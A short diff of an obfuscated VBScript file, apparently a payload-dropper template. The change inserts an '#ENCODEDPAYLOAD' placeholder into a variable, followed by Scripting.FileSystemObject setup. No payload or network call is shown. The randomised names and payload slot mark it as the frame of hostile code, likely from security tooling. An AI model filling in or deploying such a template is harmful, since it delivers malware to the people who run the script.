@@ -9,7 +9,7 @@ Function QzmJtOmm(GWXgtsftxiYK)
 End Function
 
 Function OzLswswIbyr()
-	mkvdRRlb = ""
+	mkvdRRlb = "#ENCODEDPAYLOAD"
 	Dim lMwSgSdvthtJh
 	Set lMwSgSdvthtJh = CreateObject("Scripting.FileSystemObject")
 	Dim fDTFDArXBnfXlV
